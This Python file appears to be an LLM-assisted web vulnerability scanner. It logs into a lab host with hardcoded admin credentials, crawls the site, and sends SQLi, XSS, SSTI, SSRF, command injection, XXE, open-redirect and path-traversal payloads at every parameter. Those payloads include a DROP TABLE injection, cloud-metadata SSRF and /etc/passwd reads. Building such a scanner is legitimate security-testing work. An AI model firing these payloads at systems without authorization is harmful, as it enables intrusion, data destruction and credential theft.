"""
BRAHMASTRA — Full Authenticated Deep Scan
- Logs in with credentials
- Crawls every page following all links (authenticated)
- Discovers every form, input, query param, API endpoint
- Tests every parameter for: SQLi, XSS, SSTI, SSRF, IDOR, XXE, Open Redirect, Command Injection
- ALL vulnerability intelligence from Brahmastra model only
"""
import asyncio
import json
import re
import sys
from datetime import datetime
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import httpx

TARGET      = "https://192.168.68.58"
USERNAME    = "admin"
PASSWORD    = "krishna1$"
MODEL_URL   = "http://localhost:11435/api/chat"
MODEL_NAME  = "brahmastra"
REPORT_PATH = "/tmp/full_scan.json"
MAX_PAGES   = 100
VERIFY_SSL  = False

# ── Payload Libraries ─────────────────────────────────────────────────────────
PAYLOADS = {
    "SQLi": [
        "' OR '1'='1'--",
        "' OR 1=1--",
        "1' AND SLEEP(3)--",
        "' UNION SELECT NULL,NULL,NULL--",
        "admin'--",
        "') OR ('1'='1",
        "1; DROP TABLE users--",
        "' AND 1=2 UNION SELECT table_name,NULL FROM information_schema.tables--",
    ],
    "XSS": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)",
        "\"><img src=x onerror=alert(1)>",
        "<body onload=alert(1)>",
    ],
    "SSTI": [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "SSRF": [
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://localhost:22/",
        "http://0.0.0.0:80/",
        "file:///etc/passwd",
        "http://[::1]/",
    ],
    "IDOR": [
        "1", "2", "3", "0", "-1", "9999",
        "admin", "root", "user",
    ],
    "CMD": [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
    ],
    "XXE": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]><foo>&xxe;</foo>',
    ],
    "OpenRedirect": [
        "//evil.com",
        "https://evil.com",
        "/\\evil.com",
        "javascript:alert(1)",
    ],
    "PathTraversal": [
        "../../etc/passwd",
        "../../../etc/passwd",
        "....//....//etc/passwd",
        "%2e%2e%2fetc%2fpasswd",
    ],
}

# ── Heuristic Detectors ───────────────────────────────────────────────────────
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_",
    "unclosed quotation", "you have an error in your sql", "warning: mysql",
    "invalid query", "microsoft ole db", "odbc driver", "sql server",
    "division by zero", "quoted string not properly terminated",
    "syntax error", "mysql_num_rows", "supplied argument is not",
    "pg_exec", "db2_", "sybase",
]
XSS_MARKERS = [
    "<script>alert(1)</script>", "onerror=alert(", "onload=alert(",
    "svg onload=", "javascript:alert",
]
SSTI_RESULTS = ["49", "7777777"]
CMD_MARKERS  = ["uid=", "root:x:", "bin/bash", "bin/sh"]
XXE_MARKERS  = ["root:x:0:0", "daemon:", "/bin/bash", "etc/passwd"]
PTRAV_MARKERS = ["root:x:0:0", "daemon:", "nobody:"]

def heuristic(payload_val: str, vuln_type: str, body: str, status: int) -> tuple[bool, str]:
    b = body.lower()
    if vuln_type == "SQLi":
        for err in SQLI_ERRORS:
            if err in b:
                return True, f"SQL error in response: '{err}'"
    if vuln_type == "XSS":
        for m in XSS_MARKERS:
            if m.lower() in b:
                return True, f"XSS payload reflected unescaped"
    if vuln_type == "SSTI":
        for r in SSTI_RESULTS:
            if r in body:
                return True, f"SSTI: expression evaluated to '{r}'"
    if vuln_type == "CMD":
        for m in CMD_MARKERS:
            if m in body:
                return True, f"Command injection: output '{m}' in response"
    if vuln_type == "XXE":
        for m in XXE_MARKERS:
            if m in body:
                return True, f"XXE: file content '{m}' in response"
    if vuln_type == "PathTraversal":
        for m in PTRAV_MARKERS:
            if m in body:
                return True, f"Path traversal: '{m}' in response"
    if vuln_type == "SSRF" and status in (200, 301, 302):
        if any(m in b for m in ["ec2", "ami-id", "instance-id", "root:", "ssh"]):
            return True, f"SSRF: internal content in response"
    return False, ""

# ── Model Analysis ────────────────────────────────────────────────────────────
ANALYSIS_SYSTEM = """You are BRAHMASTRA, an elite DAST security scanner.
Analyze the HTTP response to an injected payload and determine if a vulnerability exists.

Respond with EXACTLY one tool call:
  report_finding(severity="HIGH", type="SQL Injection", url="/path", parameter="param", evidence="exact evidence from response", cvss=8.5, remediation="Use parameterized queries")
  mark_clean(url="/path", parameter="param", reason="no evidence of vulnerability")

Valid severity values: CRITICAL, HIGH, MEDIUM, LOW
Valid type values: SQL Injection, XSS, SSTI, SSRF, IDOR, Command Injection, XXE, Open Redirect, Path Traversal

NEVER output non-English text. NEVER explain. Just output the tool call."""

ANALYSIS_TMPL = """Payload injected into parameter '{param}' of {method} {url}
Vulnerability class being tested: {vuln_type}
Payload used: {payload}

HTTP Response:
  Status code: {status}
  Body (first 800 chars):
{body}

Does this response indicate a {vuln_type} vulnerability?
"""

async def ask_brahmastra(url: str, param: str, method: str, vuln_type: str,
                          payload_val: str, resp_status: int, resp_body: str) -> dict | None:
    """Ask Brahmastra to analyze an HTTP response. Returns finding dict or None."""
    msg = ANALYSIS_TMPL.format(
        param=param, method=method, url=url, vuln_type=vuln_type,
        payload=payload_val, status=resp_status,
        body=resp_body[:800],
    )
    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            r = await client.post(MODEL_URL, json={
                "model":    MODEL_NAME,
                "messages": [
                    {"role": "system", "content": ANALYSIS_SYSTEM},
                    {"role": "user",   "content": msg},
                ],
                "stream":  False,
                "options": {"temperature": 0.05, "num_predict": 300},
            })
            r.raise_for_status()
            output = r.json()["message"]["content"]

        m = re.search(r'report_finding\(([^)]+)\)', output, re.DOTALL)
        if not m:
            return None
        args = m.group(1)
        def ga(name, default=""):
            p = re.search(rf'{name}=["\']([^"\']*)["\']', args)
            if p: return p.group(1)
            p = re.search(rf'{name}=([\d.]+)', args)
            if p: return p.group(1)
            return default
        return {
            "severity":    ga("severity", "MEDIUM"),
            "type":        ga("type", vuln_type),
            "evidence":    ga("evidence", "Detected by Brahmastra"),
            "cvss":        float(ga("cvss", "6.5")),
            "remediation": ga("remediation", "Sanitize all user input"),
        }
    except Exception as e:
        print(f"      [Model error] {e}")
        return None

# ── HTTP Helpers ──────────────────────────────────────────────────────────────
class AuthSession:
    """Authenticated HTTP session."""
    def __init__(self):
        self.cookies: dict = {}
        self.headers: dict = {
            "User-Agent": "Brahmastra/1.0 DAST Scanner",
        }
        self.request_count = 0

    async def login(self, target: str, username: str, password: str) -> bool:
        login_url = target.rstrip("/") + "/login.php"
        try:
            async with httpx.AsyncClient(verify=VERIFY_SSL, follow_redirects=False,
                                          timeout=15.0) as client:
                r = await client.post(login_url,
                                       data={"uname": username, "pwd": password},
                                       headers=self.headers)
                # Grab all Set-Cookie headers
                for k, v in r.cookies.items():
                    self.cookies[k] = v
                # Follow redirect manually to get more cookies
                if r.status_code in (301, 302):
                    loc = r.headers.get("location", "")
                    if loc:
                        if not loc.startswith("http"):
                            loc = target.rstrip("/") + "/" + loc.lstrip("/")
                        r2 = await client.get(loc, cookies=self.cookies,
                                               headers=self.headers)
                        for k, v in r2.cookies.items():
                            self.cookies[k] = v
                print(f"  [Auth] Login {'OK' if self.cookies else 'FAILED'} — cookies: {list(self.cookies.keys())}")
                return bool(self.cookies)
        except Exception as e:
            print(f"  [Auth] Login error: {e}")
            return False

    async def get(self, url: str, params: dict = None) -> httpx.Response | None:
        self.request_count += 1
        try:
            async with httpx.AsyncClient(verify=VERIFY_SSL, follow_redirects=True,
                                          timeout=15.0) as client:
                return await client.get(url, params=params, cookies=self.cookies,
                                         headers=self.headers)
        except Exception as e:
            print(f"      [HTTP GET error] {url}: {e}")
            return None

    async def post(self, url: str, data: dict = None, json_data: dict = None,
                   content: bytes = None, content_type: str = None) -> httpx.Response | None:
        self.request_count += 1
        try:
            hdrs = {**self.headers}
            if content_type:
                hdrs["Content-Type"] = content_type
            async with httpx.AsyncClient(verify=VERIFY_SSL, follow_redirects=True,
                                          timeout=15.0) as client:
                if content is not None:
                    return await client.post(url, content=content, cookies=self.cookies,
                                              headers=hdrs)
                elif json_data is not None:
                    return await client.post(url, json=json_data, cookies=self.cookies,
                                              headers=hdrs)
                else:
                    return await client.post(url, data=data or {}, cookies=self.cookies,
                                              headers=hdrs)
        except Exception as e:
            print(f"      [HTTP POST error] {url}: {e}")
            return None

# ── Crawler ───────────────────────────────────────────────────────────────────
async def crawl(target: str, session: AuthSession) -> list[dict]:
    """
    Crawl all pages of the target, authenticated.
    Returns list of test points: {url, path, param, method, type}
    """
    base = target.rstrip("/")
    visited   = set()
    queue     = [base + "/"]
    test_points = []
    parsed_base = urlparse(base)

    def is_same_domain(url: str) -> bool:
        p = urlparse(url)
        return (p.netloc == "" or p.netloc == parsed_base.netloc or
                p.netloc == parsed_base.hostname)

    def normalize(url: str, from_url: str = base) -> str:
        if url.startswith("//"):
            url = parsed_base.scheme + ":" + url
        elif url.startswith("/"):
            url = base + url
        elif not url.startswith("http"):
            url = urljoin(from_url, url)
        return url.split("#")[0].rstrip("/") or base + "/"

    def extract_params_from_url(url: str) -> list[dict]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        path = parsed.path or "/"
        return [
            {"url": base + path, "path": path, "param": k, "method": "GET", "ptype": "query"}
            for k in qs
        ]

    def parse_page(html: str, page_url: str) -> tuple[list[str], list[dict]]:
        """Return (links_to_follow, test_points_found)."""
        links = []
        points = []

        # All href links
        for href in re.findall(r'href=["\']([^"\'#][^"\']*)["\']', html, re.I):
            if href.startswith("javascript:") or href.startswith("mailto:"):
                continue
            full = normalize(href, page_url)
            if is_same_domain(full):
                links.append(full)
                # Check if link has query params
                points.extend(extract_params_from_url(full))

        # All forms
        for form_match in re.finditer(
            r'<form([^>]*)>(.*?)</form>', html, re.DOTALL | re.I
        ):
            form_attrs = form_match.group(1)
            form_body  = form_match.group(2)

            action = re.search(r'action=["\']([^"\']*)["\']', form_attrs, re.I)
            action = action.group(1) if action else page_url
            action = normalize(action, page_url)

            method_m = re.search(r'method=["\'](\w+)["\']', form_attrs, re.I)
            method = method_m.group(1).upper() if method_m else "GET"

            # Enctype for file uploads / XML
            enc = re.search(r'enctype=["\']([^"\']+)["\']', form_attrs, re.I)
            enctype = enc.group(1) if enc else "application/x-www-form-urlencoded"

            inputs = re.findall(
                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:type=["\']([^"\']*)["\'])?',
                form_body, re.I
            )
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', form_body, re.I)
            selects   = re.findall(r'<select[^>]*name=["\']([^"\']+)["\']',   form_body, re.I)

            parsed_action = urlparse(action)
            path = parsed_action.path or "/"

            for inp, inp_type in inputs:
                inp_type = inp_type.lower() if inp_type else "text"
                if inp_type in ("submit", "button", "image", "reset", "hidden"):
                    continue
                if inp.lower() in ("csrf_token", "_token", "__token"):
                    continue
                points.append({
                    "url": action, "path": path, "param": inp,
                    "method": method, "ptype": "form",
                })
            for ta in textareas:
                points.append({"url": action, "path": path, "param": ta,
                                "method": method, "ptype": "form"})
            for sel in selects:
                points.append({"url": action, "path": path, "param": sel,
                                "method": method, "ptype": "select"})

        # Inline JS fetch/XHR with URLs
        for js_url in re.findall(r'["\'](/[^"\'?#]+\?[^"\']+)["\']', html):
            full = base + js_url
            points.extend(extract_params_from_url(full))
            links.append(full.split("?")[0])

        # API-style endpoints from JS
        for api in re.findall(r'["\']((?:/api/|/v\d/)[^"\'?]+)["\']', html, re.I):
            links.append(base + api)

        return links, points

    pages_crawled = 0
    while queue and pages_crawled < MAX_PAGES:
        url = queue.pop(0)
        url_clean = url.split("?")[0]
        if url_clean in visited:
            continue
        visited.add(url_clean)
        pages_crawled += 1

        print(f"  [Crawl] {url}")
        resp = await session.get(url)
        if resp is None or resp.status_code >= 400:
            continue
        if "text/html" not in resp.headers.get("content-type", ""):
            continue

        html = resp.text
        new_links, new_points = parse_page(html, url)

        # Add params from this URL itself
        new_points.extend(extract_params_from_url(url))

        for link in new_links:
            lclean = link.split("?")[0]
            if lclean not in visited and is_same_domain(link):
                queue.append(link)

        for pt in new_points:
            key = f"{pt['path']}:{pt['param']}:{pt['method']}"
            if not any(f"{t['path']}:{t['param']}:{t['method']}" == key for t in test_points):
                test_points.append(pt)

    print(f"  [Crawl] Done — {pages_crawled} pages, {len(test_points)} test points")
    return test_points

# ── Per-Parameter Scanner ─────────────────────────────────────────────────────
CVSS_MAP = {
    "SQLi":          (9.8, "CRITICAL"),
    "XSS":           (6.1, "MEDIUM"),
    "SSTI":          (9.0, "CRITICAL"),
    "SSRF":          (8.6, "HIGH"),
    "CMD":           (9.8, "CRITICAL"),
    "XXE":           (8.2, "HIGH"),
    "IDOR":          (7.5, "HIGH"),
    "OpenRedirect":  (6.1, "MEDIUM"),
    "PathTraversal": (7.5, "HIGH"),
}
REMEDIATION = {
    "SQLi":          "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
    "XSS":           "HTML-encode all user-controlled output. Implement Content-Security-Policy headers.",
    "SSTI":          "Never pass user input to template engines. Use sandboxed rendering.",
    "SSRF":          "Whitelist allowed URL schemes and hosts. Block internal IP ranges (127.0.0.1, 169.254.x.x, 10.x.x.x).",
    "CMD":           "Never pass user input to shell commands. Use safe APIs. Whitelist allowed values.",
    "XXE":           "Disable external entity processing in XML parsers. Use a safe XML library.",
    "IDOR":          "Implement server-side authorization checks. Verify ownership before returning data.",
    "OpenRedirect":  "Validate and whitelist redirect targets. Reject off-domain redirects.",
    "PathTraversal": "Canonicalize paths and verify they stay within the allowed base directory.",
}

async def scan_parameter(session: AuthSession, pt: dict) -> list[dict]:
    """Scan one parameter for all vulnerability types."""
    url    = pt["url"]
    path   = pt["path"]
    param  = pt["param"]
    method = pt["method"]
    findings = []
    param_lower = param.lower()

    # Choose relevant vuln types based on param name hints
    all_types = list(PAYLOADS.keys())

    # Prioritize by param name hints
    priority = []
    if any(x in param_lower for x in ("id", "uid", "user", "account", "num")):
        priority.append("IDOR")
    if any(x in param_lower for x in ("url", "uri", "redirect", "next", "dest", "callback", "return")):
        priority.extend(["SSRF", "OpenRedirect"])
    if any(x in param_lower for x in ("file", "path", "dir", "page", "template", "doc")):
        priority.append("PathTraversal")
    if any(x in param_lower for x in ("cmd", "exec", "run", "shell", "ping")):
        priority.append("CMD")
    if any(x in param_lower for x in ("xml", "data", "body", "payload")):
        priority.append("XXE")

    # Always test SQLi, XSS, SSTI for every param
    test_order = list(dict.fromkeys(priority + ["SQLi", "XSS", "SSTI"] + all_types))

    for vuln_type in test_order:
        payloads = PAYLOADS.get(vuln_type, [])
        confirmed = False

        for payload_val in payloads[:4]:  # Max 4 payloads per vuln type
            # Send the actual HTTP request
            if method == "POST":
                resp = await session.post(url, data={param: payload_val})
            elif vuln_type == "XXE":
                # Send as raw XML body
                xml_payload = payload_val
                resp = await session.post(url, content=xml_payload.encode(),
                                           content_type="application/xml")
            else:
                resp = await session.get(url, params={param: payload_val})

            if resp is None:
                continue

            body   = resp.text[:1500]
            status = resp.status_code

            # 1. Heuristic check first
            vuln, evidence = heuristic(payload_val, vuln_type, body, status)

            if not vuln:
                # 2. Ask Brahmastra to analyze
                brahmastra_result = await ask_brahmastra(
                    url=url, param=param, method=method, vuln_type=vuln_type,
                    payload_val=payload_val, resp_status=status, resp_body=body,
                )
                if brahmastra_result:
                    vuln     = True
                    evidence = brahmastra_result.get("evidence", "Detected by Brahmastra")

            if vuln:
                cvss, default_sev = CVSS_MAP.get(vuln_type, (6.5, "MEDIUM"))
                findings.append({
                    "severity":    default_sev,
                    "type":        vuln_type,
                    "url":         path,
                    "full_url":    url,
                    "parameter":   param,
                    "method":      method,
                    "payload":     payload_val,
                    "evidence":    evidence,
                    "cvss":        cvss,
                    "remediation": REMEDIATION.get(vuln_type, "Sanitize all user input."),
                    "timestamp":   datetime.utcnow().isoformat(),
                })
                sev = default_sev
                print(f"  [!!!] {sev:8s} {vuln_type:15s} @ {path} param={param!r}")
                print(f"         payload : {payload_val[:60]!r}")
                print(f"         evidence: {evidence[:120]}")
                confirmed = True
                break  # One confirmed finding per vuln type is enough

        if not confirmed:
            pass  # Clean for this vuln type

    return findings

# ── Main ──────────────────────────────────────────────────────────────────────
async def main():
    print("=" * 70)
    print("  BRAHMASTRA — Full Authenticated Deep Scan")
    print(f"  Target : {TARGET}")
    print(f"  Auth   : {USERNAME} / {'*' * len(PASSWORD)}")
    print(f"  Model  : {MODEL_NAME} @ {MODEL_URL}")
    print("=" * 70)
    print()

    session = AuthSession()

    # Step 1: Login
    print("[1] Authenticating...")
    ok = await session.login(TARGET, USERNAME, PASSWORD)
    if not ok:
        print("  WARNING: Login failed — continuing as unauthenticated")

    # Step 2: Crawl
    print("\n[2] Crawling all pages...")
    test_points = await crawl(TARGET, session)

    if not test_points:
        print("  No test points found — exiting")
        return

    # Deduplicate
    seen = set()
    unique_points = []
    for tp in test_points:
        key = f"{tp['path']}|{tp['param']}|{tp['method']}"
        if key not in seen:
            seen.add(key)
            unique_points.append(tp)

    print(f"\n[3] Scanning {len(unique_points)} unique parameters...")
    print(f"    Vulnerability classes: {', '.join(PAYLOADS.keys())}")
    print()

    all_findings = []
    for i, pt in enumerate(unique_points, 1):
        print(f"\n  [{i}/{len(unique_points)}] {pt['method']} {pt['path']} — param: {pt['param']!r}")
        findings = await scan_parameter(session, pt)
        all_findings.extend(findings)

    # Deduplicate findings (same path+param+type)
    seen_f = set()
    deduped = []
    for f in all_findings:
        key = f"{f['url']}|{f['parameter']}|{f['type']}"
        if key not in seen_f:
            seen_f.add(key)
            deduped.append(f)

    all_findings = deduped

    # Sort by CVSS descending
    sev_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
    all_findings.sort(key=lambda x: sev_order.get(x["severity"], 0), reverse=True)

    # ── Summary ────────────────────────────────────────────────────────────────
    print("\n" + "=" * 70)
    print(f"  SCAN COMPLETE")
    print(f"  Total HTTP requests  : {session.request_count}")
    print(f"  Parameters tested    : {len(unique_points)}")
    print(f"  Vulnerabilities found: {len(all_findings)}")
    print()
    counts = {}
    for f in all_findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
        if sev in counts:
            print(f"    {sev:10s}: {counts[sev]}")
    print("=" * 70)

    # ── Write JSON Report ──────────────────────────────────────────────────────
    report = {
        "tool":            "BRAHMASTRA AI-Native DAST Scanner",
        "version":         "1.0.0",
        "scan_id":         f"brahmastra-{datetime.utcnow().strftime('%Y%m%d-%H%M%S')}",
        "target":          TARGET,
        "scan_type":       "authenticated_deep_scan",
        "authenticated":   ok,
        "credentials":     {"username": USERNAME},
        "started_at":      datetime.utcnow().isoformat(),
        "total_requests":  session.request_count,
        "pages_crawled":   len(seen),
        "params_tested":   len(unique_points),
        "summary": {
            "total":    len(all_findings),
            "critical": counts.get("CRITICAL", 0),
            "high":     counts.get("HIGH", 0),
            "medium":   counts.get("MEDIUM", 0),
            "low":      counts.get("LOW", 0),
        },
        "findings": all_findings,
    }

    with open(REPORT_PATH, "w") as f:
        json.dump(report, f, indent=2)
    print(f"\n  JSON report: {REPORT_PATH}")

    # ── Print Findings Table ───────────────────────────────────────────────────
    if all_findings:
        print("\n  VULNERABILITY REPORT")
        print("  " + "-" * 68)
        print(f"  {'#':<3} {'SEV':<9} {'TYPE':<18} {'URL':<25} {'PARAM':<12} {'CVSS'}")
        print("  " + "-" * 68)
        for i, f in enumerate(all_findings, 1):
            url_short = f['url'][:24]
            print(f"  {i:<3} {f['severity']:<9} {f['type']:<18} {url_short:<25} {f['parameter']:<12} {f['cvss']}")
        print("  " + "-" * 68)
        print()

        print("  DETAILED FINDINGS")
        print()
        for i, f in enumerate(all_findings, 1):
            print(f"  [{i}] {f['severity']} — {f['type']}")
            print(f"       URL        : {f['full_url']}")
            print(f"       Parameter  : {f['parameter']}  ({f['method']})")
            print(f"       Payload    : {f['payload'][:80]!r}")
            print(f"       Evidence   : {f['evidence'][:150]}")
            print(f"       CVSS       : {f['cvss']}")
            print(f"       Fix        : {f['remediation'][:120]}")
            print()

if __name__ == "__main__":
    asyncio.run(main())
